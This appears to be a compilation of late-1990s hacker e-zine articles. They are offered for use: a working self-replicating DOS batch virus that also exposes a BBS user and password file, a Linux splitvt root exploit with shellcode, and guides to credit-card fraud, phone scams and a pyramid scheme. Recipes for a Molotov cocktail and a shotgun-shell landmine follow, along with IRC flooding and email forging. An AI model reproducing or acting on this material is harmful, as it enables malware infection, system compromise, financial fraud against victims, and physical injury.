
rem Every line containing "wombat" (in uppercase) will be copied!

rem Every line in only uppercase is part of the virus!
rem %_wombat_% is just an empty variable!
rem Every line with "rem" is a comment!
rem
rem Wombat V1.0 By TNSe! :)
rem  The Last Word In Batch Viruses ... uh?
rem   Absolute Size : 1187+ bytes... (Hint: Infect a 0 byte .BAT file,
rem    which is partly interesting, cause it shows you a bug :)
rem
rem PS: They are slow? .. What? are you running with NO smartdrv?
rem     or is your machine just another 386-12 MHz?? ;)
rem
rem This BatVirus will make a command in PCBoard Help called
rem Wombat. Just make the SysOp run this BatVirus, and enter
rem ? Wombat in the PCBoard prompt!
rem
GOTO WOMBAT_%WOMBAT%
rem What part of the BatVirus do we want to execute?

:WOMBAT_INFECT_ME
FIND "WOMBAT" %1>NUL
rem is this bat file Already infected?
IF ERRORLEVEL==1 GOTO WOMBAT_DO_INFECT
rem not good ... already infected!
GOTO ABSOLUTE_END %_WOMBAT_%

:WOMBAT_DO_INFECT
rem Here we do the infection
IF EXIST %TEMP%\_WOMBAT_.TMP DEL %TEMP%\_WOMBAT_.TMP
rem Does the backup file exist? Don't show errormessys by checking!
COPY %1 %TEMP%\_WOMBAT_.TMP>NUL
rem Copy the file to %TEMP% .. if there's no TEMP, then the root will be used
TYPE %0|FIND "WOMBAT">%1
rem Copy Wombat into a new file!
TYPE %TEMP%\_WOMBAT_.TMP>>%1
rem Attach the Original file!
DEL %TEMP%\_WOMBAT_.TMP
rem Delete the copy
ECHO. >>%1%_WOMBAT_%
rem Place an extra enter before the next ...
ECHO :ABSOLUTE_END>>%1%_WOMBAT_%
rem Where to jump when WomBat is finished!
GOTO ABSOLUTE_END %_WOMBAT_%
rem exit this batvirus

:WOMBAT_
rem Main procedure!
SET MAIN_WOMBAT=%0
rem %0 is the name of the starting file
IF NOT EXIST %MAIN_WOMBAT% SET MAIN_WOMBAT=%MAIN_WOMBAT%.BAT
rem if the guy wrote the name of the file, without .BAT ... he shitted
IF NOT EXIST %MAIN_WOMBAT% SET MAIN_WOMBAT=AUTOEXEC.BAT
rem Well... This means that it is AUTOEXEC.BAT we are in! (Because
rem %0 is nuttin when autoexec.bat is called!
rem ... let's fix it!
SET WOMBAT_TAIL=
rem ... clean out tail before entering
:WOMBAT_FIX_TAIL
IF .%1==. GOTO WOMBAT_GET_INFECT
rem if %1 is empty, quit this and continue
SET WOMBAT_TAIL=%WOMBAT_TAIL% %1
rem copy next %1 into the command tail...
SHIFT %_WOMBAT_%
rem (%_wombat_% is empty) this command makes %1 become %2 .. (rotates
rem %1 %2 %3 ... %9 So that every parameter passed is kept!
GOTO WOMBAT_FIX_TAIL
rem Keep copying

:WOMBAT_GET_INFECT
rem find a nice file to infect
SET WOMBAT=INFECT_ME
rem this is the routine we want to do!
FOR %%C IN (C:\AUTOEXEC.BAT *.BAT ..\*.BAT) DO CALL %MAIN_WOMBAT% %%C
rem find some fine victims!
SET WOMBAT=END
rem next time, we're outta here (And do some damage!)
%MAIN_WOMBAT% %WOMBAT_TAIL%
rem Make it look like santa claus was here (nobody saw him?)

:WOMBAT_TROJANIZE
rem Here we do the trojanizing :))
IF .%1==. GOTO ABSOLUTE_END  %_WOMBAT_%
rem ... no more paths to look through!
SHIFT %_WOMBAT_%
rem .. now %0 becomes %1, %1 becomes %2 .. etc
IF NOT EXIST %0\PCBOARD.EXE GOTO WOMBAT_TROJANIZE
rem .. if PCBoard.exe didn't exist there ... too bad! :)
ECHO %%%0\MAIN\USERS>%0\HELP\WOMBAT
rem ... that was the dir :) ... hehehehehe
rem which makes a file C:\HISDIR!\HELP\Wombat with the contents:
rem %C:\HISDIR!\DAT\USERS, that will list all his users and PWD's for you..
rem as long as it is not crypted! .. argh :)
GOTO ABSOLUTE_END %_WOMBAT_%
rem .. We've done enuff!

:WOMBAT_END
SET WOMBAT=TROJANIZE
CALL %MAIN_WOMBAT% %PATH%
rem Go through ALL the path statements ... looking for PCBoard!
rem .. hehe.. .Let's hope he has his PCBoard Dir in the path ...

rem getting outta here
SET WOMBAT=
SET WOMBAT_TAIL=
SET MAIN_WOMBAT=
rem all variables cleaned out ... Like Spring cleaning! :)

:ABSOLUTE_END
rem the absolute last in this BatVir!


                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Splitvt exploit (LINUX)    (_)      Written by: Djnad
-----------------------------------------------------------------------------


How to get root on a linux host if you have a shell on the host...
With the splitvt exploit.


one day i decided to play around with telnet and ended up with :
Playing around on a local server i tought to myself.. HEY there must be
a way to do that.. now you think to yerself "Lamah to do WHAT?!" well to
hack the shit.. i thougt IF you had a SHELL on you'r victime's machine..
and wanted to fuq the shit.. upload this phile
***DO REMEMBER TO CUT!***


THIS IS A MUTERFUCKIN' LONG LINE! I KNOW! (LONG,LONG,LONG)

------------- ( Cut ) ------------------------------------------------

/* splitvt exploit
 * syntax:
 * cc -o null null.c     [kfc96 exploit]
 * $>null         [LiNUX systems affected]
 * $>null
 * $>splitvt
 * $>whoami   [root]
*/

long get_esp(void)
{
__asm__("movl %esp,%eax\n");
}
main()
{
  char eggplant[2048];
  int a;
  char *egg;
  long *egg2;
  char realegg[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
  char *eggie = realegg;

  egg = eggplant;


  *(egg++) = 'H';
  *(egg++) = 'O';
  *(egg++) = 'M';
  *(egg++) = 'E';
  *(egg++) = '=';

  egg2 = (long *)egg;

  for (a=0;a<(256+8)/4;a++) *(egg2++) = get_esp() + 0x3d0 + 0x30;

  egg=(char *)egg2;

  for (a=0;a<0x40;a++) *(egg++) = 0x90;

  while (*eggie)
    *(egg++) = *(eggie++);
  *egg = 0; /* terminate eggplant! */

  putenv(eggplant);

  system("/bin/bash");
}



------------- ( CUT ) ---------------------------------------------------

and ren the file to "null.c" upload it to some directory or somthing..
now what this LINE / FILE tryes to do i give you ROOT status..
it uses ASM (Assembly) so you need to compile it.. by typing..

1.       gcc -o null null.c
2.       root
3.       whomai ..
3.       adduser djnad <HEhe>
4.       adduser TBH <w3-k1ck-ass>

if your shell or your provider doesn't allow you to use compile or GCC
. you'r sold - you can't run the script.. so don't bother.
what HOLE this script uses I realy don't know.. but it works..
anyway's IF it worked.. you would have ROOT (GOD) status.. :).. you can
DO what EVER you please with the commputer.. yeah.. anyway's DON'T BLAME
ME if this doesn't work for u, and it fuq's up the server.. blame yourself
for doing it..

I have not tested is.. couse i can't afford being busted right now at the
moment.. since im going on away to an forgin country for som weekeeis.. :) but
it work's TRUST me. ..

------------------------------ ( Djnad / -TBH^Pd-Kru ) - ( djnadX08 ) ---



                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Visa/Credit Card Scam      (_)      Written by: Codeblaster
-----------------------------------------------------------------------------


 VISA/CREDITCARD SCAM
 --------------------

 Someone has to have thought of this one before! ;) Anywayze, I'm releasing
 it cause it was a cool idea I got the other day, and it works really nice.

 You know all those sex-payweb-sites? You enter your visa/mastercard/whatever
 and you get to enter the realms of PORN? ;). You enter fex. your visa number
 and pay eg. 25$ to see live nude girls stripping etc. Well, what about setting
 up your own little TEMPTING sex site, a real payweb sex site, so that people
 has to enter their visa/mastercard etc. to enter. Setting up your own site,
 and advertising it enough, can get you alot of valid visa's.

 Ofcourse, you can't set it up on your home-adress, cause then you might get
 busted for this, so what you do is getting a site from one of those free
 website providers, here are two adresses you can use:

 http://www.geocities.com
 http://www.angelfire.com

 I'm sure there are more of these too, but these two will do for now.

 Now you just rip some html code from a payweb site (or make it yourself if
 you're not an inet-lamah), and set it up. Modify the code a bit, so that the
 visas are saved/encrypted in a DAT file, witch you just visit to collect
 once in a while. (Remember - never make the code so that the visa's are sent
 to you or something, cause then you'll get busted for sure).

                                         - Keep fraudin' strong, Codeblaster!

                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Another CC Scam            (_)      Written by: Codeblaster
-----------------------------------------------------------------------------


 CREDIT CARD SCAM #2
 -------------------

 Saw this one on 'NOWHERE MAN' :)

 ------------------------
 YOU: Hello, I'm calling from Seltec - we're releasing a new hair product,
      and wondered if you would like to get a free sample?
 HER: Ohhh.. yes!
 YOU: OK, I need your name and adress then please.
 HER: Sure, it's Dumb Bitch, 502 Looserstreet, Looserplace.
 YOU: ... and credit card number for future buyings.
 HER: Hmm, oki 4002XXXXXXXXXXXX
 YOU: Ok, thank you Mrs. Bitch, you will have the sample in your mail
      in a couple of days.
 ------------------------

 Some people are dumb you know. It migth be an idea to know who you're
 calling, so you know if they're interested in a new hair product at all.
 And, It might be a good idea to mail her some shit too, so that she doesn't
 get suspicious when she doesn't get anything in her mail.

                                        - Keep fraudin' strong!, Codeblaster

                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Obtain A Visa Number       (_)      Written by: Ripperjack
-----------------------------------------------------------------------------

How to obtain a visa card number?

You report your neighbour's visa stolen and they shut down the card and say
that they will send you a new one soon. Every morning until your neighbour
gets the visa, you wake up early and check your neighbour's mailbox. Eventually
you will get the visa, and now it's ready for abuse. ;D

                                                     , ripperjack

                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Phone Scam!                (_)      Written by: Codeblaster
-----------------------------------------------------------------------------


 PHONE SCAM
 ----------

 I've translated this text directly from norwegian to english, so I'm not sure
 it'll be just as convincing in english, but you'll get the idea. Using re-
 direction...

 ----------------------------------
 YOU> Hello, my name is Tommy Hansen and I'm calling from Telecom West, we
      have experienced some problems with your telephone line.
 HIM> Oh? What kind of problem.
 YOU> Your line has been crosslinked sir. That means you may have experiensed
      line noise, sudden line-cuts, other voices on your line, etc. This is
      quite irritating for you ofcourse, and fortuately it can be fixed very
      easily. Can you find a pen and something to write on sir?
 HIM> Yeah, sure.

     <Finding pen & paper>

 HIM> Ok.
 YOU> Good, write down the numbers I tell you, and enter it on your phone as
      soon as I hang up.
 HIM> Ok.
 YOU> *21*003190320320# - You got that?
 HIM> Yeah, *21*003190320320# Right?
 YOU> Yes, that is correct sir. Ok, I'm going to hang up now. Just enter the
      numbers, and when you hear an 'alarm'-like-sound, you hang up.
 HIM> Ok, and everything will be fixed then?
 YOU> Yes, as I said, this is just a minor problem.
 HUM> Ok, bye then.
 YOU> Bye, and thanks a lot for your help (and I mean that!)
 ----------------------------------

 If they refuse to do what you tell them to, there are several things you could
 say, like:

 - This is just a small problem. It's alot easier if you could do this yourself
   so we don't have to send someone over to you.
 - Ok. We'll send someone over to fix it rigth away, you will have to pay the
   extra expences of 78$ though.
 - We will have to cut your phone for a week or two until we can send someone
   over to fix it then. (No more phone privilegies for you! ;))

 Almost everybody will do as they tell you if you say one of the above, no one
 wants to loose their phone for 2 weeks, or pay 78$ for something they can
 do in 2 secs themself. But remember; this require you be convinsing and don't
 sound like a 14year old kiddie.

                                                            - Codeblaster/TBH


                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Internet Outdials          (_)      Written by: Phiber X
-----------------------------------------------------------------------------



     Hackers guide to INTERNET OUTDIALS.


 Index:

    1. What are internet outdials?
    2. How are they accessed?
    3. What can internet outdials be used for by hackers?
    4. What are the adresses to some internet outdials?
    5. How can internet outdials be found?


    1. What are internet outdials?

    Internet outdials are basicly modems connected to telnet sites
    that can be used by users of the site to call out.
    Naturally if the site that offers this to it's local users is
    connected to the internet, then anyone who can access the site
    can use the outdial (that is if the service is not restricted to
    local users, which it often is).
    Usually the outdials are restricted to making local calls, either
    by disallowing certain affixes to be dialed (that is numbers that
    come first (much like the man when having sex, wait.. no not really)),
    or by having set the first few numbers and only allowing a certain
    number of numbers to be manually entered.
    There are however exceptions to this, these are called Global OutDials
    (GOD), and allow long distance calls. These are however very rare, and
    tend to close down quikly if they are released.

    2. How are they accessed?

    By using a telnet program when connected to your ISP, and entering
    the adress of the telnet site and channel at the appropriate place.
    Then just manouver your way to the outdial (usually obtained by
    entering ATDT XXXXXXXX, where X is number, but this varies greatly).

    3. What can internet outdials be used for by hackers?

    Aha.. The essence :-)!!
    Now, IOD can be used for many things, the most obvious beeing able
    to connect to foreign BBS's on local charge. But to real hackers, that's
    not really FUN (it can be however, quite usefull when the phonebill comes).
    The thing I see it most usefull as is to avoid detection when hacking.
    Because: A direct connection to your target is (to say the least) quite
    risky especially in these digital days, but if you first connect to the
    inet, call an outdial, say in Britain, and then connect to your target in
    another country, then tracing you will be A HELL OF a lot harder, also if
    they trace your phonecall to another country, then they usually must be
    SERIOUSLY pissed to bother trying to find you. Like they probably are at
    those guys that deleted 11.000 homepages on "Telenor" ISP in Norway
    (Way to go guys, whomever you are! ).

    4. What are the adresses to some internet outdials?

    First response: "I don't have a FUCKING clue when you read this"
    Second response: "Check out 2600 faq available almost everywhere on
                      the net, they have a pretty good list"

    5. How can internet outdials be found?

    a) Search the net
    b) Check out good hacker releases, 2600 and Phrack for example
    c) Learn how to get access to some of the outdials in the 2600 faq
       and use these commands on other telnet sites you encounter (or hack).
       Chances you find one is.. ehmm.. slim, but if you do your in for a
       treat.




     Written by Phiber X, of "No Shit!"
     at 01:28:39, the 9th of April 1997


    I can be found on Death Wish BBS in NORWAY, if you have any comments,
    please let me know (that includes any outdials you might have :-) )


                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Visa Carding Made Easy     (_)      Written by: Codeblaster
-----------------------------------------------------------------------------



 Visa Carding Made Easy
 ----------------------

 Ok, anyone knows that a visa number is 16 digits. How it's build up
 though, is more unknown. It's really easy, and in this article I'm
 going to show you how to get someones ViSA number just by getting
 their bank number. .. eh, bank account number - whatever (no: kontonummer)

 The visa number is always build up like this:

            Ú> Bank Account Number
      ÚÄÄÄÄÄÁÄÄÄÄÄ¿
 4925 YYYY-YY-YYYYY X
 ÀÂÄÙ               ³
  À> Bank Prefix    À> Unknown (X)

 Prefix  : 4925 (Always 4925 in Norway!)
                This is the bank prefix. If you have a list, just search
                the list for the name of the bank, and you'll find the
                prefix. If you don't have a list, get The Generator 2.0
                when it's out :)
 Account : 3531 15 31892 (example)
 Unknown : 2

 As you see, this makes 16 digits - a valid visa card number.

 - But, how do I find X?
 Well, to find the unknown (the last digit in the visa), use some visa
 generator to validate the card, try using 1 first, if it's valid then
 write it down. Then you try 2, etc. and write down the numbers that
 passed the test. If you got more than one number that passed that test
 then you'll have to do the 'payweb test' to. Just login to some payweb
 porn site on the net, and try the different numbers, the payweb site
 will check the number, and you'll find the correct one.

 How to do it:
 -------------
 What you need is quite simple someones bank account number, and that's
 not hard to find at all. Just visit your local bank and get some notes
 from their trash, on many of these you will find:
                        1) Cardholders Name
                        2) Bank Account Number
 Use the method explained earlier in this article to get the visa number.
 Now the only thing you need is the expire date, visit some payweb porn
 site on the net and try out every date (3/1/97, 2/1/97, 3/1/97 etc.)

 Now you've got, Cardholders Name, Visa Number and Expire Date. What more
 do you need? Go card! :)

                                                            - Codeblaster/TBH

                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Make Money =)              (_)      Written by: Ripperjack
-----------------------------------------------------------------------------


HOW A PYRAMID SCHEME WORKS!!!

1) This is how our pyramid looks, every star presenting a player.
                                  *
                                *   *
                               **   **

2) Eight new players have joined, each paying f.ex. 10$ to the one on the top
   of the pyramid.
                                  *
                                *   *
                               **   **
                             ****   ****

3) Now the guy on the top has received his money and disappears. The pyramid
   will split into two pyramids.
                           *              *
                         *   *          *   *
                        **   **        **   **

4) This will repeat itself thousands of times untill the pyramid stops. When
   the pyramid has stopped, a lot of people will loose their money, so join

   early and you're ensured profit.

                                                                - Ripperjack


                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Easy Explosives            (_)      Written by: Codeblaster
-----------------------------------------------------------------------------




                              EASY EXPLOSIVES
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I don't take any credits for this file, as it's just stuff I've picked up from
different bbs's and text files, not figgured out myself. Since I remember it,
it has to mean that it's easy-to-make explosives ;), so here's a collection
of recepies for you who just hate those "76% sulfiric+23% nitric acid+ etc.".


                                                .,;::.
                                              _oO ::;'
                                            _(_ _  /  o O ( sounds scary! )
                          Ú-----------------\__\/_/--¿
--[1]---------------------|  - PLASTiC EXPLOSIVES -  |--------------------[1]--
                          À--------------------------Ù

  Here's what you do to make some easy plastic explosives:

  Mix: 2/3 Vaseline            |/////////|  <- Gasoline  \
       1/3 Gasoline            |%%%%%%%%%|                > Mix'em
                               |%%%%%%%%%|  <- Vaseline  /
                               `---------'

  Now, this mixture has to be set off electricly (that's why it's called
  plastic explosives, dumbass). That means that some matches won't do, so
  make yourself a little electric detonator and you're rockin'.


                                                .,;::.
                                              _oO ::;'    ( think I'll stick
                                            _(_ _  /  o O ( to my pipe...
                          Ú-----------------\__\/_/--¿
--[2]---------------------|     -  SMOKE BOMBS -     |-------------------Ä[2]--
                          À--------------------------Ù

 Smoke bombs can come in handy sometimes, fex. if you want free from school
 and stuff like that ;)

 1) Mix: 1/3 SUGAR
         2/3 EPSON SALTS (Magnesium Sulphate - you can easily get this from
                          school or something, and it's not illigal, so you
                          can legally get it elsewhere too)

 2) Put the mixture in a tincan (an old coke-box or something) and heat the
    stuff up with a lighter or something, so that it melts.

     |         |  <- A tincan
     |    .:.  |                          ________
     | .,;::;,.|  <- the mixture                  |/
     `---------'                                  |
         /|                                       |     <- rest of the
        |~|       <- Lighter              ________|        coke-box ;)
        |_|

 3) Now, wait a while, so that the gel hardens, then add a fuse (a match
    or something)

 And voila, you've got yourself a little smokebomb, and this one is quite
 goot too :)


                                                .,;::.
                                              _oO ::;'
                                            _(_ _  /  o O ( hum, interesting
                          Ú-----------------\__\/_/--¿
--[3]---------------------|    -  DISKETTE BOMB  -   |-------------------Ä[3]--
                          À--------------------------Ù

 You've probably heard/read about this bomb before, since it's an old one,
 but I'm including it here anyways, for those of you who haven't seen it
 before (coz it's cool :)

 What you need:
                1) A Diskette (3,5")
                2) Matches (Those you can ignite anywhere)
                3) Nail Polish
                4) A knife

 What you do:
              1) Use the knife to open the diskette (split it into to pieces)
              2) Remove that white, round, cotton shit inside.
              3) Crush the matches into powder with a wooden scraper or
                 something, so that you have a nice little amount of match-
                 powder.
              4) Spread the powder inside the disk, like nice, white snow
                 on a winterlandscape (ahh... poetic huh?)
              5) Spread some nail polish over the match powder laying in the
                 diskette, and wait till it's dry.
              6) Put the diskette back together, and use glue or something
                 (or the nailpolish!) to make the two pieces stay together.

 Now you've made yourself a little diskette bomb, and when your "friend"
 puts it in his diskette drive, and the drive head attempts to read the
 disk, the disk starts to spin, and ... the result will be an ignition of
 the matches inside, wich will cause the disk to melt in the small fire,
 and it'll be stuck in the disk drive. Quite nasty ;) .. And remeber, you
 have to use those matches that you can ignite everywhere. Have phun!

                                                .,;::.
                                              _oO ::;'
                                            _(_ _  /  o O ( napalm stuff....
                          Ú-----------------\__\/_/--¿
--[4]---------------------|      - FIRE BOMB -       |-------------------Ä[4]--
                          À--------------------------Ù

 Oki, probably everyone know what this is. You know those bottles you see
 the demostrants in eastern-europe etc. throwing at the millitary tanks and
 police in a riot. Yeah, those are the one I'm talking about. Now, most peopl
 think it's JUST gasoline in a bottle, but here's the way to make a good
 one:

 What you need:
               1) A bottle or a Jam-Mug (so long it's made out of glas)
               2) Gasoline to fill 2/3 of the bottle.
               3) Oil to fill 1/3 of the bottle.
               4) A piece of RAG (a piece of an old t-shirt, whatever)
     *         5) Cork for the bottle
    ***
   |#|**
  / * \**  <- Gasoline-Soaked rag
 |:::::|*
 |:::::|                        +-------------------------------------------+
 |:::::|                        | Guess everyone know how to use this one,  |
 |:::::|   <- 2/3 Gasoline      | just ignite the rag-fuse, and throw the   |
 |&&&&&|                        | bottle. When the bottle lands on some-    |
 |&&&&&|   <- 1/3 Oil           | thing hard, it will break, and the oil/   |
 ~~~~~~~                        | gasoline mix will ignite, giving it a     |
                                | sort of "napalm" effect :)                |
                                +-------------------------------------------+


                                                .,;::.
                                              _oO ::;'
                                            _(_ _  /  o O ( yah, in the good
                          Ú-----------------\__\/_/--¿    ( old days we'dd..
--[5]---------------------|       - LANDMINE -       |-------------------Ä[5]-
                          À--------------------------Ù

 Here's a simple way to make a landmine:

 You need: 1) A Wooden plank
           2) A Brick
           3) A Shotgun Shell
           4) A Big Nail

 What you do:

 - Use a drill or something to make a hole in the brick. Don't make a hole,
   straight through, just so you can put the shotgun shell in..
 - Put the shotgun shell in the hole.
 - Nail the nail through the middle of the wooden plank.
 - Now, place the wooden plank on the brick, so that the nail goes into
   the hole that the shotgun shell is placed in.


 _______________________________--__________________________________________
| wooden plank                  || <- nail                                  |
|_______________________________||__________________________________________|
  .--------------------------.  ||   .------------------------------------.
  |                          |  ||   |                                    |
  | brick                    || ||  ||                                    |
  |                          || ||  ||                                    |
  |                          || \/  ||                                    |
  |                          ||~~~~~||                                    |
  |                          ||     || <- hole w/shotgun shell in it.     |
  |                          ||_____||                                    |
  |                          ~~~~~~~~~                                    |
  `-----------------------------------------------------------------------'

 As you see in the ascii above (nice ascii huh?;), that when somebody steps
 on the plank the nail will put pressure on the shotgun shell, and it will
 go off sending splints everywhere. Now go bury it somewhere...

                                            - Keep Hacking Strong, Codeblaster!

                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Newbie Flooding            (_)      Written by: Djnad
-----------------------------------------------------------------------------


 Hey there.. well I'm off with a bit new information.. see irc (internet relay
 chat) is very common these days so I thought I might teach u sum.. this
 file will not contain any hacks or whatever, just some basic information
 on irc. how to protect yerself.. and how to avoid ppl annoying your ass off.
 so read and have fun ;)..

 *NOTE* sorry if my english is a bit rusty, but I don't really care!..

 irc is a chat program, usually the command irc at your unix prompt will give
 you ircII, then yer ready to go chatting, (Norwegian - Pr›v via unix prompten
 irc <IRCnicket dit> irc.homelien.no) (To find irc server's try searching the
 web for IRC servers) well the most used and the oldest server I guess is
 EFFNet (Electronic Freedom Founduration Net) it's the largest, and the second
 larges irc server is Undernet.. well I use EFFNet, so I suggest you do too
 ;).. well ok, before you get TOO exited, you might want to know that there
 are some loonies on irc to, ppl who just want to have fun with you, and mess
 up your great time. ppl who do takeover's on channel's and play around with
 your stuph.. if for instant you start a channel called #megafun you're the
 first in that channel you get OPS (@X07
 kick and ban ppl from you're channel.. so let's say you have gotten some
 friend's in you're new channel, and suddenly some on comes in the channel and
 want's op's, you SHOULD NOT give them ops, the may just fuck your channel,
 and you may just say bye bye to it.. well if you're smart and don't give them
 ops, they probably will try to do something else to get ops. like flooding
 what flooding does is to send something to you as many times' as possible.
 for instants a TXT flood will send you alot of msg's giving you lotsa crap on
 your screen, this is really annoying but usually can't cause any harm..you
 could stop txt flooding by using the command /ignore IRCnick. but let's say
 this guy wants that op so bad, he doesn't give up.. he would probably
 begin to CTCP or ICMP flood you (They are also know as nuke or mass flood)

 *NOTE* ICMP stands for Internet Control Message Protocol (so you IRC internet
 elite loonies, if you dind know that, you're a LOOSER! :)) for instant
 icmp redirected messages are used by routers to tell other computers "Quit
 sending me that junk, send it to No where.poo.net !" so an
 ICMP redirct message could cause your irc messages to go to hell.
 eof stand's for "End of file." "Dead Socket" refers to ppp, or in other
 words you aren't on irc any more.. you quitted..

 other ways to flood is to ping flood you (Ping will send a msg to the guy
 you ping and return to u and tell you how long time it used to reach the
 other guy), ping flood is also know as ICBM flood.

 so what all that I have written above is to say "Flooding = Sending as much
 crap you can to yer victim.. ok how's more detailed info..

 ---------------------------------- TXT -------------------------------------
 the simples way to flood some one is by TXT flooding someone, by sending
 the same msg Over and over again, will be f***ing annoying right? saying you
 got the same msg 10 times in 4 sec? yeah.. well it's not much more use
 to flood some one by txt, cause most servers has text flood filter's
 So only txt flood some one if you want to be annoying ;)

 ---------------------------------- CTCP ------------------------------------
 Ctcp (Client to client protocol) flooding is the most effective flood.
 this is kinda like ping, it checks if you're host is weither or not alive
 so if you make a script doing the command /ctcp <nick> echo FUCK YOU THIS
 IS A FLOOD! 100 times it's a 100000 time more effective than txt flood!
 but the only backdrop is that you would get an answer 100 time too =(
 so leave out the ECHO part ;).. ok well the next and just as effective as
 the ctcp command is the PING command.. it operates in the same way (DAMN
 DIDN'T I CHOSE A NERDY THING TO WRITE ABOUT??!?!)..

 well ok, a more experienced flooder would ame at your "dynamically assigned
 IP" (Internet protocol) he would not flood you at the irc, nor at the server
 by you MODEM directly, so if you got an 28.8 or 14.4 modem, and the flooder
 got an ISdn connection, you're bound to get dropped off, or if you're really
 luck only Lagged like hell

 ok, so? what are you trying to say don't use irc?
 no what I am really trying to say is to, get a program that runs in the back
 ground of the proggy u use to protect you're self.. script's like Spam.irc
 phoenix, acid!irc, 7th Sphere, PhytKrakr, |MaGuS|, precurser Etc. Etc.


 Well since this is the most LAMEST thing I've ever written, I have decided to
 quit RIGHT here.

 have phun
                                                     Djnad / enterprise (C) 97

                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Send FAKE Emails           (_)      Written by: Djnad
-----------------------------------------------------------------------------

Is there anything like sitting in a chair with some nice jungle uplifting vibes
in the background. a cup of tea, reading? Letting the information flow through 
your brain.. NOPE, there isn't!. Knowledge is power and power is the coolest   
thing you can ever poses.. so therefor have I decided to write my knowledge    
so you can, expand yer knowledge, and yer power! so please, put some music on. 
make yourself a cup of tea, and get the power you always wanted to poses.:)    
well that's all the morals I'm gonna teach you ;).. hehe, on to the real       
thing!                                                                         
                                                                               
Hacking. the word conjures up evil computer geniuses..                         
                                                                               
Just a small note! for you newbies / wannabies                                 
                                                                               
Define: 3l1t3, 31337, and so on, all means "Elite", the hacker's who do some   
elee7 thing almost always use some thing's to make the writing a bit more      
advanced, like if I would write access it would probably be soothing like      
axx or acz, axz etc. etc.                                                      
                                                                               
ok one more thing I'm sick of ppl (People) saying "I want to learn ElItE       
hacking but I don't want to learn unix, nor programing!.. d00dz YEAH,          
GIMME SOME CREDITCARDZ!" FUCK EM!.. ha, they suck the whole secret behind      
hacking is knowledge, the lust to learn.. and reading. this do not mean that   
you should never do a hack. but it means you need to have the will to learn..  
hanging in #2600 or #hack #phreak etc. etc. do not mean that you're a hacker.. 

an hacker operates online and offline... ok well on to the next part ;) fake   
email via telnet, this /hack/ (Ehm Hrmze) means you could really do some       
heroic hacking in 1/2 hour! impress you're friends! ;)..                       
                                                                               
-----------------------                                                        
Ok have you ever heard of Robert morris? he was the creator of "morris worm"   
witch took down the internet in 1990. of course the bug that he exploited to   
get the worm to fill up 10% of the computer systems on the internet with       
his self mailing virus has been fixed on most internet computers..             
But there is still some heroic thing's you can do ;).. not take down like 10   
systems in 10 mins, no. you can use the same method that Robert M. used        
forge email! whoa doesn't that sound cool?.. well it is.. you can do some      
evil deeds with that.. I'm not gonna teach you how to break into private       
parts of the system (YAH HAPPY HARDCORE RULE! cd yaknow ;)), besides I'm not   
very fond of jail.. ;) well to do this /hack/ you need a shell account!..      
if you haven't got one yet, GET ONE!.. a shell account is an internet account. 
witch you can use unix command's (Norwegian note! - SN internet har slike      
accounter! get one!) well unix is the language on the internet, so if you want 
to be a REALLY good hacker, you will need to learn unix.                       
Ok when you have gotten your shell account, let's say that you're on it now    
and are able to use the unix commands.. test the telnet, do this:              
"telnet ns.interlink 20" if you get to interlink and get some stuff on your    
screen, you're in business! ;) if you never telenetted before you have done it 
now! ;) cool?, well this /hack/ is STUPID simple, get to the prompt again      
norwgian note again - har du sn s† vill det vere oslonet.no%) do this command: 
                                                                               
"telnet callisto.unm.edu 25" (I took this ip cause i know it allows what we'll 
                              do, right fake emails! ;)                        
                                                                               
What that "25" in the back means' is that (once AGAIN HAPPY HARDCORE RULE!)    
you telenetted to callisto's email send port (An port is somewhere informa     
tion goes in and out. on yer PC you got standard 4 port's Screen,mouse,modem   
Keyboard. well these hostes on the internet has ALOT of port's that's not      
physical, nope you can not see them ;)..) you may happened to hit a firewall   
(Security program), but most often you won't, well I'm sure you got into       
callisto so let's see what we can do .. Whoa, it didn't ask for a logon, it    
just say's READY!. cool?.. well that's cause it runs "Smail3.1.28.1" it's      
a email program, type "help" or "?" and you will get                           
                                                                               
250 The following SMTP commands are recognized                                 
250                                                                            
250   HELO hostname                                                            
250   MAIL FROM:<sender address>                                               
250   RCPT TO:<recipient address>                                              
250   VRFY <address>                                                           
250   EXPN <address>                                                           
250   DATA                                                                     
250   RSET                                                                     
250   NOOP                                                                     
250   DEBUG [level]                                                            
250   HELP                                                                     
250   QUIT                                                                     
                                                                               
+ some more crap..                                                             
                                                                               
do it like this                                                                
                                                                               
----------------------- The hack! --------------------------------             
                                                                               
helo motherfucker@nowhere.dreamland.org                                        
250 callisto.unm.edu Hello motherfucker@nowhere.dreamland.org                  
mail from:motherfucker@nowhere.dreamland.org                                   
250 <motherfucker@nowhere.dereamland.org>                                      
rcpt to:mmiri@sn.no                                <- YER OWN EMAIL OFCUZ!!!   
250 Reciver ok!                                                                
data                                                                           
354 Enter mail, end with "." on a line by itself                               
Fake email test!!!!!!! doe's it work??                                         
.                                                                              
250 Mail accepted                                                              
---------------------------------------------------------------------------    
now check your mail ;).. have phun                                             
                                                                               
Btw; don't go and buy book's like "hack the unix Super manual 200"             
     no real hacker's read and study Book's like the unix manual!              
                                                                               
                                                           Djnad / Enterprise

                                    ,,,
_______________________________oOO_(o-o)_OOo_________________________________
Subject: Finger Trick               (_)      Written by: Djnad
-----------------------------------------------------------------------------


Hey, once again ;) it's me djnad again.. well since I first learned you
how to fraud emails' here's how to finger user's via telnet.. really really
simple ;).. but very useful, in fact finger (port 79) is the most common way
